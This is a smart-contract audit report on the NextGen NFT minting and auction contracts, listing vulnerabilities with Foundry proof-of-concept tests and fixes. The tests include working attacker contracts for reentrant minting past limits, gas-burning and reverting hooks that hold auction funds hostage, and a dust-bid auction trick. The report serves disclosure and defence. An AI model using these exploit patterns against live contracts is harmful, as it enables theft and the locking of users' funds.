| Severity | Title |
| -------- | -------- | 
|H-01 |Users can Bypass Token Minting Limit |
|H-02 |The attacker can win any auction with a dust price |
|H-03 |Any bidder could cause DOS in auctionDemo#claimAuction |
|M-01 |Last-second minter would overpay mint price if salesOption == 2  |
|M-02 |Bid Amount Sent to Auction Contract Owner in claimAuction Function Instead of NFT Owner  |
|M-03 |Auction winner could cause DOS in auctionDemo#claimAuction  |
|M-04 |AuctionDemo.sol Allows Bidding After Auction Ends resulting in loss of user's ether  |
|M-05 | Artist's signature can be forged|
|L-01| the keyhash used to requestRandomWords is set to Goerli Network instead of Ethereum Mainnet|
|L-02| addRandomizer function accepts any arbitray address as the randomizer contract|
|L-03| randomPool#getWord function return the same value for id == 0 and 1|
|L-04| fulfillRandomWords function in RandomizerRNG and RandomizerVRF contracts could set the same hash for two different tokens|

## [H-01]  Users can Bypass Token Minting Limit 

## Vulnerability details
A critical vulnerability has been identified in the NextGenCore mint(), burnToMint(), and airDropTokens() functions. This vulnerability allows to minting of tokens beyond the maximum limits due to a reentrancy issue. The current implementation of the functions does not adhere to the Checks-Effects-Interactions (CEI) pattern, with state changes occurring at the end of the functions. This oversight enables users to re-enter the mint functions multiple times, effectively bypassing the predefined limit for token minting.

### Impact

The impact of this vulnerability is significant as it allows users on the allow list to exceed their token minting limit. This can lead to uncontrolled minting of tokens, potentially causing:

1. Devaluation of the token due to oversupply.
2. Unfair distribution of tokens among allowed users.
3. Loss of trust in the token's integrity and the underlying smart contract's reliability.




### Proof of Concept

1. User calls the mint() function.
2. Due to the lack of CEI pattern adherence, the user re-enters the mint() function before the initial call completes.
3. This process can be repeated, allowing the user to mint more tokens than their allowed limit.
The next foundry test could show the exploit scenario when the attacker mints 2 NFTs in the collection that allows minting only 1 token per address:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Base.t.sol";
import "forge-std/Test.sol";
import {IERC721} from "../smart-contracts/IERC721.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract ReenterMint is Base, Test {
    
    Attacker attacker;
    address user;

    function setUp() public {
        user = makeAddr("user");
        _deploy();
        skip(1 days);
        _createCollectionWithSaleOption2();
    }

    function test_exploit() public payable {
        uint256 collectionId = 1;
        bytes32[] memory emptyProof;
        uint256 endTime = nextGenMinterContract.getEndTime(collectionId);
        vm.warp(endTime-1);

        uint256 price = nextGenMinterContract.getPrice(collectionId);
        vm.deal(user, price * 2);
        vm.startPrank(user);
        nextGenMinterContract.mint{value: price}(collectionId, 1, 1, "", user, emptyProof, address(0), 0);
        // Minting second token to EOA address would revert since max allowance per address is 1
        vm.expectRevert();
        nextGenMinterContract.mint{value: price}(collectionId, 1, 1, "", user, emptyProof, address(0), 0);
        vm.stopPrank();

        attacker = new Attacker(nextGenMinterContract, price, collectionId);
        vm.deal(address(attacker), price * 2);
        vm.prank(address(attacker));
        nextGenMinterContract.mint{value: price}(collectionId, 1, 1, "", address(attacker), emptyProof, address(0), 0);
        // Attacker successfully minted 2 tokens using reentrancy and bypassed max mint check
        assertEq(nextGenCore.balanceOf(address(attacker)), 2);
    }
}

contract Attacker {
    NextGenMinterContract minter;
    uint256 price;
    uint256 collectionId;
    constructor(NextGenMinterContract _minter, uint256 _price, uint256 _collectionId) {
        minter = _minter;
        price = _price;
        collectionId = _collectionId;
    }

    function mint() public payable {
        bytes32[] memory emptyProof;
        minter.mint{value: price}(collectionId, 1, 1, "", address(this), emptyProof, address(0), 0);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (IERC721(msg.sender).balanceOf(address(this)) == 1) {
            mint();
        } 
        return hex'150b7a02'; 
    }
}
```

This test requires a ```Base.t.sol ```file: https://gist.github.com/sashik-eth/accf61913418dddc86d94ff5ae6fe9bd

In the same way, allowlist checks could be bypassed or Merkle proof reused.

## Recommended Mitigation Steps
1. Implement Checks-Effects-Interactions Pattern: Restructure the mint() function to follow the CEI pattern, ensuring state changes occur before external calls.
2. Reentrancy Guard: Introduce a reentrancy guard to prevent recursive calling of the mint() function.


## [H-02]  The attacker can win any auction with a dust price

## Vulnerability details

```AuctionDemo``` allows putting a new bid only if it is greater than the current highest bid, at the same time the first bid could be even 1 wei:
```
File: AuctionDemo.sol
57:     function participateToAuction(uint256 _tokenid) public payable {
58:         require(msg.value > returnHighestBid(_tokenid) && block.timestamp <= minter.getAuctionEndTime(_tokenid) && minter.getAuctionStatus(_tokenid) == true);
59:         auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
60:         auctionInfoData[_tokenid].push(newBid);
61:     }
```
This creates an attack vector when the exploiter puts 2 bids right after the auction starts - first with a very low price and second with a very high price. This effectively prevents other users from placing new bids with reasonable prices. Closer to the auction end time attacker could simply cancel a higher bid and win the auction with a low bid.
### Impact
An attacker could win any auction with a much lower price (even with 1 wei if they bid the first one) than a "real" price of NFT.

### Proof of Concept
Next foundry test could show an exploit scenario:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Base.t.sol";
import "forge-std/Test.sol";

contract TwoBidsWin is Base, Test {
    address attacker;
    address user;

    function setUp() public {
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        _deploy();
        skip(1 days);
        _initAuction();
    }

    function test_exploit() public payable {
        vm.deal(attacker, 100.1 ether);
        // Attacker puts two bids - one on a very low price and the second on a very high price
        vm.startPrank(attacker);
        auction.participateToAuction{value: 0.1 ether}(tokenId);
        auction.participateToAuction{value: 100.0 ether}(tokenId);
        vm.stopPrank();

        vm.deal(user, 0.2 ether);
        vm.prank(user);
        // User's bids with resealable prices are reverted
        vm.expectRevert();
        auction.participateToAuction{value: 0.2 ether}(tokenId);

        uint256 endTime = nextGenMinterContract.getAuctionEndTime(tokenId);
        vm.warp(endTime);

        vm.startPrank(attacker);
        // Attacker cancels own 'high' bid and wins auction using 'low' bid
        auction.cancelBid(tokenId, 1);
        auction.claimAuction(tokenId);
        vm.stopPrank();
        // Attacker won an auction spending a much lower amount of eth
        assertGe(attacker.balance, 100 ether);
    }
}
```
This test requires a Base.t.sol file: https://gist.github.com/sashik-eth/accf61913418dddc86d94ff5ae6fe9bd

## Recommended Mitigation Steps
Consider allowing to place new bids even if they are lower than the current highest bid. This would guarantee that when the highest bidder cancels their bid closer to the auction ending NFT would be selling for a reasonable price.

## [H-03]  Any bidder could cause DOS in auctionDemo#claimAuction

## Vulnerability details

```auctionDemo#claimAuction``` is called by the auction winner or admin when the auction is ended. This function sents NFT token to the winner's address, the winning bid to the previous owner of NFT and refunds all bidders that do not win an auction:

```
File: AuctionDemo.sol
104:     function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
105:         require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
106:         auctionClaim[_tokenid] = true;
107:         uint256 highestBid = returnHighestBid(_tokenid);
108:         address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
109:         address highestBidder = returnHighestBidder(_tokenid);
110:         for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
111:             if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
112:                 IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
113:                 (bool success, ) = payable(owner()).call{value: highestBid}("");
114:                 emit ClaimAuction(owner(), _tokenid, success, highestBid);
115:             } else if (auctionInfoData[_tokenid][i].status == true) {
116:                 (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
117:                 emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
118:             } else {}
119:         }
120:     }
```
At line 116 contract makes a call to the bidder's address with a refund of ether value. The result of this call is not required to be successful, so this looks safe at first sight since if the bidder contract simply reverts this - loop will continue its execution. However, the bidder contract could spend 63/64 gas of the current transaction. This would lead to a revert in the next calls inside the refunding loop.

Increasing the TX gas limit up to the max gas limit (block gas limit) would not prevent an exploit since an attacker could place few bids causing spending more than 63/64 of TX gas.
### Impact
Any bidder could cause permanent DOS on the auctionDemo#claimAuction function blocking all bids and NFT token inside the auction contract. An attacker could turn off DOS, releasing hostage assets at any time, and require redemption for this.
### Proof of Concept
Next foundry test could show an exploit scenario:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Base.t.sol";
import "forge-std/Test.sol";

contract DosOnRefund is Base, Test {
    Attacker attacker;
    address user;

    function setUp() public {
        attacker = new Attacker();
        user = makeAddr("user");
        _deploy();
        skip(1 days);
        _initAuction();
    }

    function test_exploit() public payable {
        vm.deal(address(attacker), 1 wei);
        vm.prank(address(attacker));
        auction.participateToAuction{value: 1 wei}(tokenId);

        vm.deal(address(attacker), 2 wei);
        vm.prank(address(attacker));
        auction.participateToAuction{value: 2 wei}(tokenId);

        vm.deal(user, 3 ether);
        vm.prank(user);
        auction.participateToAuction{value: 3 ether}(tokenId);
        
        uint256 endTime = nextGenMinterContract.getAuctionEndTime(tokenId);
        vm.warp(endTime);
        // Tx reverts since too much gas spent inside refunds calls on the attacker contract
        vm.expectRevert();
        auction.claimAuction(tokenId);
        // Attacker could release hostage assets at any time
        attacker.allowClaim();
        auction.claimAuction(tokenId);
    }
}

contract Attacker { 
    bool shouldSpendGas = true;
    function allowClaim() external {
        shouldSpendGas = false;
    }

    receive() external payable {
        if (shouldSpendGas) {
            for (uint256 i; i < type(uint256).max; ++i) {}
        }
    }
}
```
This test requires a Base.t.sol file: https://gist.github.com/sashik-eth/accf61913418dddc86d94ff5ae6fe9bd
Also foundry.toml file should include the next line:
```gas_limit = 30000000```
## Recommended Mitigation Steps
Consider updating the refund flow in a way that each bidder calls withdraws for their bids instead of forcing sending all bids in the auctionDemo#claimAuction function.


## [M-01]  Last-second minter would overpay mint price if salesOption == 2

## Vulnerability details
```NextGenMinterContract#getPrice``` returns the price for minting a new token. If the collection has ```salesOption``` with value 2 and the current timestamp is between ```allowlistStartTim```e and ```publicEndTime```, this function would calculate the mint price between values of ```collectionMintCost``` and ```collectionEndMintCost```. Price is changing consistently with the growing ```block.timestamp``` value:
```

    function getPrice(uint256 _collectionId) public view returns (uint256) {
        uint tDiff;
        if (collectionPhases[_collectionId].salesOption == 3) {
            // increase minting price by mintcost / collectionPhases[_collectionId].rate every mint (1mint/period)
            // to get the price rate needs to be set
            if (collectionPhases[_collectionId].rate > 0) {
                return collectionPhases[_collectionId].collectionMintCost + ((collectionPhases[_collectionId].collectionMintCost / collectionPhases[_collectionId].rate) * gencore.viewCirSupply(_collectionId));
            } else {
                return collectionPhases[_collectionId].collectionMintCost;
            }
        } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp < collectionPhases[_collectionId].publicEndTime){
            // decreases exponentially every time period
            // collectionPhases[_collectionId].timePeriod sets the time period for decreasing the mintcost
            // if just public mint set the publicStartTime = allowlistStartTime
            // if rate = 0 exponetialy decrease
            // if rate is set the linear decrase each period per rate
            tDiff = (block.timestamp - collectionPhases[_collectionId].allowlistStartTime) / collectionPhases[_collectionId].timePeriod;
            uint256 price;
            uint256 decreaserate;
            if (collectionPhases[_collectionId].rate == 0) {
                price = collectionPhases[_collectionId].collectionMintCost / (tDiff + 1);
                decreaserate = ((price - (collectionPhases[_collectionId].collectionMintCost / (tDiff + 2))) / collectionPhases[_collectionId].timePeriod) * ((block.timestamp - (tDiff * collectionPhases[_collectionId].timePeriod) - collectionPhases[_collectionId].allowlistStartTime));
            } else {
                if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) {
                    price = collectionPhases[_collectionId].collectionMintCost - (tDiff * collectionPhases[_collectionId].rate);
                } else {
                    price = collectionPhases[_collectionId].collectionEndMintCost;
                }
            }
            if (price - decreaserate > collectionPhases[_collectionId].collectionEndMintCost) {
                return price - decreaserate; 
            } else {
                return collectionPhases[_collectionId].collectionEndMintCost;
            }
        } else {
            // fixed price
            return collectionPhases[_collectionId].collectionMintCost;
        }
    }
```
Minting functions in ```MinterContract``` allow minting tokens when ```block.timestamp == publicEndTime```:
```
File: MinterContract.sol
196:     function mint(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance, string memory _tokenData, address _mintTo, bytes32[] calldata merkleProof, address _delegator, uint256 _saltfun_o) public payable {
...
221:         } else if (block.timestamp >= collectionPhases[col].publicStartTime && block.timestamp <= collectionPhases[col].publicEndTime) {
222:             phase = 2;
223:             require(_numberOfTokens <= gencore.viewMaxAllowance(col), "Change no of tokens");
224:             require(gencore.retrieveTokensMintedPublicPerAddress(col, msg.sender) + _numberOfTokens <= gencore.viewMaxAllowance(col), "Max");
225:             mintingAddress = msg.sender;
226:             tokData = '"public"';
```
At the same time ```getPrice``` function returns the ```collectionMintCost``` price in case ```block.timestamp``` is equal to ```publicEndTime```. This creates a scenario where minting at the publicEndTime - 1 timestamp is more cost-effective than minting at the ```publicEndTime``` timestamp. This discrepancy arises from the accurate price drop in the first case contrasted with the wrongly returned ```collectionMintCost``` value in the second case.
### Impact
Last-second minter would overpay the mint price if the case of the collection with ```salesOption == 2```.


### Proof of Concept
The next foundry test shows how last-second minter is overpaid compared to the minter from the previous second:

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Base.t.sol";
import "forge-std/Test.sol";

contract OverpayOnLastMint is Base, Test {
    
    address user1;
    address user2;

    function setUp() public {
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        _deploy();
        skip(1 days);
        _createCollectionWithSaleOption2();
    }

    function test_exploit() public payable {
        uint256 collectionId = 1;
        bytes32[] memory emptyProof;
        uint256 endTime = nextGenMinterContract.getEndTime(collectionId);
        vm.warp(endTime-1);

        // Minting price for one second before minting ends is correctly dropped lower 
        uint256 price = nextGenMinterContract.getPrice(collectionId);
        vm.deal(user1, price);
        vm.prank(user1);
        nextGenMinterContract.mint{value: price}(collectionId, 1, 1, "", user1, emptyProof, address(0), 0);
        emit log_uint(price);
        
        // Minting when the timestamp is equal to publicEndTime would result in a higher mint price 
        skip(1);
        price = nextGenMinterContract.getPrice(collectionId);
        vm.deal(user2, price);
        vm.prank(user2);
        nextGenMinterContract.mint{value: price}(collectionId, 1, 1, "", user2, emptyProof, address(0), 0);
        emit log_uint(price);
    }
}s
```
## Recommended Mitigation Steps
Consider updating the next line in MinterContract.sol:
```
File: MinterContract.sol
-         } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp < collectionPhases[_collectionId].publicEndTime){
+         } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp <= collectionPhases[_collectionId].publicEndTime){
```

## [M-02]  Bid Amount Sent to Auction Contract Owner in claimAuction Function Instead of NFT Owner

## Vulnerability details
The ```claimAuction``` function exhibits an issue where the bid amount is erroneously transferred to the owner of the auction contract (```owner()```) instead of the rightful owner of the auctioned token (```ownerOfToken```). This issue occurs when the auction winner successfully claims the auction.
### Impact
The highest bid amount is directed to the auction contract's owner instead of the rightful owner of the NFT.


### Proof of Concept
Find the complete PoC template at https://gist.github.com/zzzuhaibmohd/9bf9d4961472560f1e03ed9a640debd6

for setup run ```forge init``` and place the file ```nextGen.t.sol``` in test Folder
```
     function test_BidAmountIsSentWrongOwner() public {
        vm.warp(25 days);

        createCollection("Test Collection 1", 1);

        // 1. Mint a token from collection Id and set to to auction
        minter.mintAndAuction(
            bob, //_recipient
            "Bob the Builder", //_tokenData
            0, //_saltfun_o
            1, //_collectionID
            block.timestamp + 5 days // _auctionEndTime
        );

        uint256 tokenId = 10000000000; // the tokenId of the auctioned NFT

        // 2. Bob provides approval to the auction contract
        vm.prank(bob);
        IERC721(core).approve(address(auction), tokenId);

        // 3. Alice places the bid for tokenId
        vm.prank(alice);
        auction.participateToAuction{value: 2 ether}(tokenId);

        vm.prank(eve);
        auction.participateToAuction{value: 3 ether}(tokenId);

        // 5. The admin calls the claimAuction transaction
        vm.warp(30 days);

        uint bob_balance_before_sale = bob.balance;
        uint auction_owner_balance_before_sale = auction.owner().balance;

        assertEq(core.ownerOf(tokenId), bob);
        auction.claimAuction(tokenId);
        assertEq(core.ownerOf(tokenId), eve);

        // 6. The ISSUE
        //Funds are sent to the auction.owner() instead of bob who is the owner of the NFT
        assertEq(
            auction.owner().balance,
            auction_owner_balance_before_sale +
                auction.returnHighestBid(tokenId)
        );
        assertEq(bob.balance, bob_balance_before_sale);
    }
```
## Recommended Mitigation Steps
To fix this issue, the bid amount should be sent to the correct recipient, namely the owner of the auctioned token (```ownerOfToken```). Below is the modified code snippet highlighting the necessary correction:

The Fix:
```

function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
    // the code
    uint256 highestBid = returnHighestBid(_tokenid);
    address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
    address highestBidder = returnHighestBidder(_tokenid);
    //console.log(auctionInfoData[_tokenid].length);
    for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
        if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
            IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
            -    (bool success, ) = payable(owner()).call{value: highestBid}("");
            +    (bool success, ) = payable(ownerOfToken).call{value: highestBid}("");
            emit ClaimAuction(owner(), _tokenid, success, highestBid);
            //rest of the code

}
```


## [M-03]  Auction winner could cause DOS in auctionDemo#claimAuction

## Vulnerability details
```auctionDemo#claimAuction``` is called by the auction winner or admin when the auction is ended. This function sents NFT token to the winner's address, the winning bid to the previous owner of NFT and refunds all bidders that do not win an auction:
```
File: AuctionDemo.sol
104:     function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
105:         require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
106:         auctionClaim[_tokenid] = true;
107:         uint256 highestBid = returnHighestBid(_tokenid);
108:         address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
109:         address highestBidder = returnHighestBidder(_tokenid);
110:         for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
111:             if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
112:                 IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
113:                 (bool success, ) = payable(owner()).call{value: highestBid}("");
114:                 emit ClaimAuction(owner(), _tokenid, success, highestBid);
115:             } else if (auctionInfoData[_tokenid][i].status == true) {
116:                 (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
117:                 emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
118:             } else {}
119:         }
120:     }
```

At line 112 contract transfers NFT to the winner's address using ```ERC721.safeTransferFrom```. However, this call includes the onERC721Received hook, which would allow an attacker to cause DOS of the claimAuction function by simply reverting any call. This would lock all bids inside the auction contract until the attacker would not change the behavior of the onERC721Received function on its address.


### Impact
The auction winner could cause permanent DOS on the auctionDemo#claimAuction function blocking all bids inside the auction contract. An attacker could turn off DOS, releasing hostage assets at any time, and require redemption for this.
### Proof of Concept
Next foundry test could show an exploit scenario:

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Base.t.sol";
import "forge-std/Test.sol";

contract HighestBidderDos is Base, Test {
    Attacker attacker;
    address user;

    function setUp() public {
        attacker = new Attacker();
        user = makeAddr("user");
        _deploy();
        skip(1 days);
        _initAuction();
    }

    function test_exploit() public payable {
        vm.deal(user, 1 ether);
        vm.prank(user);
        auction.participateToAuction{value: 1 ether}(tokenId);
        
        vm.deal(address(attacker), 2 ether);
        vm.prank(address(attacker));
        auction.participateToAuction{value: 2 ether}(tokenId);

        uint256 endTime = nextGenMinterContract.getAuctionEndTime(tokenId);
        vm.warp(endTime);
        // Transfer of NFT is reverted when onERC721Received hook is called on the attacker's address
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        auction.claimAuction(tokenId);
        // Attacker could release hostage assets at any time
        attacker.allowClaim();
        auction.claimAuction(tokenId);
    }
}

contract Attacker {
    bool shouldRevert = true;

    function allowClaim() external {
        shouldRevert = false;
    }

    function onERC721Received(address, address, uint256, bytes memory) external view returns (bytes4) {
        if (shouldRevert) {
            revert();
        } 
        return hex'150b7a02'; 
    }
}
```
This test requires a ```Base.t.sol``` file: https://gist.github.com/sashik-eth/accf61913418dddc86d94ff5ae6fe9bd

## Recommended Mitigation Steps
Consider transferring NFT to the winner's address using the ERC721.transferFrom function instead of the ERC721.safeTransferFrom, this would not allow the auction winner to block claimAuction function.


## [M-04]  AuctionDemo.sol Allows Bidding After Auction Ends resulting in loss of user's ether 

## Vulnerability details
The ```AuctionDemo.sol``` contract allows users to continue placing bids on an NFT even after the auction has officially ended and the NFT has been claimed by the highest bidder when ```block.timestamp == minter.getAuctionEndTime(tokenId)```. This issue can lead to several adverse consequences, including users losing their Ether without a way to cancel their bids.

The Attack Scenario

1. The auction contract includes a participateToAuction function that allows users to place bids.

2. The claimAuction function is designed to be called by the highest bidder or the owner after the auction has ended. It sets the auctionClaim status to true to mark the NFT as claimed.

3. Imagine multiple users try to place bids via participateToAuction while the auction is ongoing. The auction's end time is set, for example, to block #123456, and the current block timestamp is also block #123456 satisfying the condition block.timestamp == minter.getAuctionEndTime(tokenId)

4. Since the highest bidder can call claimAuction function, he/she front-runs other users successfully claiming the NFT. As a result, the auctionClaim status is set to true.

5. However, other users' bids are still pending in the mempool and get executed after the NFT is already auctioned. The participateToAuction function does not check for the auctionClaim status and accepts these bids since the condition block.timestamp <= minter.getAuctionEndTime(_tokenid) returns true.

6. Now, users who placed bids cannot cancel them due to the condition in the cancelBid function, which checks that block.timestamp is less than or equal to the auction's end time. Since the auction has ended and the NFT is claimed, users lose their Ether with no chance to cancel their bids.


### Impact
The users can continue placing bids on an NFT even after the auction has officially ended and the NFT has been claimed by the highest bidder. As a result, these late bids get accepted and later on cannot be refunded leading to users losing their Ether.
### Proof of Concept

Find the complete PoC template at https://gist.github.com/zzzuhaibmohd/9bf9d4961472560f1e03ed9a640debd6

for setup run forge init and place the file ```nextGen.t.sol``` in test Folder
```
function test_usersCanBidPostClaim() public {
        vm.warp(25 days);

        createCollection("Test Collection 1", 1);

        // 1. Mint a token from collection Id and set to to auction
        minter.mintAndAuction(
            bob, //_recipient
            "Bob the Builder", //_tokenData
            0, //_saltfun_o
            1, //_collectionID
            block.timestamp + 5 days // _auctionEndTime
        );

        uint256 tokenId = 10000000000; // the tokenId of the auctioned NFT

        // 2. Bob provides approval to the auction contract
        vm.prank(bob);
        IERC721(core).approve(address(auction), tokenId);

        // 3. Alice places the bid for tokenId
        vm.prank(alice);
        auction.participateToAuction{value: 0.05 ether}(tokenId);

        vm.warp(30 days);
        // 4. Verify the block.timestamp == minter.getAuctionEndTime(tokenId) or else the exploit wont work
        assertEq(block.timestamp, minter.getAuctionEndTime(tokenId));

        //Note: Assume that the Alice tx is the first tx that gets mined in the block.
        //One of the reasons would Alice paying higher gas price to prevent higher bids for the NFT

        // 5. Alice claims the NFT transaction
        vm.prank(alice);
        auction.claimAuction(tokenId);
        assertEq(core.ownerOf(tokenId), alice);

        //6. eve tries to snipe the NFT by placing a higher bid but Alice tx is mined first
        vm.prank(eve);
        auction.participateToAuction{value: 0.1 ether}(tokenId);

        //7. New block is mined and eve now tries to cancel the bid but it reverts with "Auction ended"
        vm.warp(block.timestamp + 1);
        assertNotEq(block.timestamp, minter.getAuctionEndTime(tokenId));

        vm.prank(eve);
        vm.expectRevert("Auction ended");
        auction.cancelBid(tokenId, 0);
    }
```

## Recommended Mitigation Steps
To mitigate this vulnerability, modify the participateToAuction function to include a check for the auctionClaim status. If the NFT has already been claimed, no further bids should be accepted.
```
function participateToAuction(uint256 _tokenid) public payable {
+    require(!auctionClaim[_tokenid], "Auction already claimed");
    require(msg.value > returnHighestBid(_tokenid) && block.timestamp <= minter.getAuctionEndTime(_tokenid) && minter.getAuctionStatus(_tokenid) == true);
    auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
    auctionInfoData[_tokenid].push(newBid);
}
```


## [M-05]  Artist's signature can be forged 

## Vulnerability details
### Impact
In NextGen, artists can sign their collections with a string. However, two critical invariants do not always hold in current implementation:

1. Once a signature is added, it must remain immutable.
2. The artistsSignatures should only be signed by the collectionArtistAddress.
### Proof of Concept
https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L149

```
In NextGen, artists can sign their collections with a string. However, two critical invariants do not always hold in current implementation:

Once a signature is added, it must remain immutable.
The artistsSignatures should only be signed by the collectionArtistAddress.
```

As the second if else branch suggests, collectionArtistAddress should only be modifiable when artistSigned is false. However, a bad collection admin can do the following to bypass the check:

1. Call setCollectionData with {_collectionArtistAddress: badAdmin, _collectionTotalSupply: 0}
2. Call artistSignature with {_signature: fakeSignature}
3. Call setCollectionData with {_collectionArtistAddress: realArtist, _collectionTotalSupply: realSupply}

In the third step, since collectionTotalSupply is zero, the artistSigned[_collectionID] == false will not be checked, which means:
1. _collectionArtistAddress can be changed to the real artist's address even after the bad collection admin already signed it.
2. The collection is not actually signed by the artist, but by the bad collection admin.

## Recommended Mitigation Steps
```
function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {
    require(_collectionTotalSupply > 0);
    ......
}
```

## [L-01] the `keyhash` used to requestRandomWords is set to Goerli Network instead of Ethereum Mainnet

### Vulnerability Details
The public `keyHash` variable is set to specific value (0x79d3d8832d904592c0bf9818b621522c988bb8b0c05cdc3b15), which is intended for use on the Goerli network. However, the contract is supposed to be deployed on the Mainnet, and the keyHash value is incompatible with the Mainnet's Chainlink VRF (Verifiable Random Function) service. Consequently, any attempts to use the requestRandomWords function for VRF v2 on the Mainnet will fail due to this mismatch.

### Proof of Concept
https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L26

## Recommended Mitigation Steps
To resolve this issue and ensure the smart contract's compatibility with the Mainnet, it is essential to update the `keyHash` variable to the appropriate value provided by Chainlink for the Mainnet VRF service. Additionally, the updateCallbackGasLimitAndKeyHash function can be utilized to allow for dynamic updates of this value in the future, should it need to be changed again.


## [L-02] `addRandomizer` function accepts any arbitray address as the randomizer contract

### Vulnerability Details
The `addRandomizer` function currently allows an administrator to associate any arbitrary address with a collection as long as the associated contract returns true for the `isRandomizerContract()` function. This approach lacks proper validation and control over which randomizer contract is associated with the collection, potentially leading to incorrect configurations.

### Proof of Concept
https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L168-L174

## Recommended Mitigation Steps
To address these issues and enhance security, it is recommended to introduce an enum to represent the available randomizer options (e.g., RandomizerRNG, RandomizerVRF, RandomizerNXT). The admin select the proper enum value to assign the randomizer contract for a collection.



## [L-03] `randomPool#getWord` function return the same value for id == 0 and 1

### Vulnerability Details
```solidity
File: XRandoms.sol
28:         if (id==0) {
29:             return wordsList[id];
30:         } else {
31:             return wordsList[id - 1];
32:         }
```
This would result in the appearance word "Acai" two times more frequently than other words, while the word "Watermelon" would never appear as a return value.

## Recommended Mitigation Steps

Consider removing the `else` branch in `randomPool#getWord`.



## [L-04] `fulfillRandomWords` function in `RandomizerRNG` and `RandomizerVRF` contracts could set the same hash for two different tokens

### Proof of Concept
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L49
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L66
```solidity
File: RandomizerRNG.sol
48:     function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers,requestToToken[id])));
50:     }
```

### Vulnerability Details
`bytes32(abi.encodePacked(numbers,requestToToken[id]))` this code expects to return a mix of returned random numbers and tokens ID, it's probably used to guarantee that two different tokens would never be filled with the same hash. However, casting to `bytes32` would cut off any data that goes after the first random number. This would result in a hash collision when two different tokens have the same hash in case if random source would ever return the same random number. 

## Recommended Mitigation Steps

Consider setting the `keccak256` hash of tokenId and random number mix instead of its `bytes32` casted value.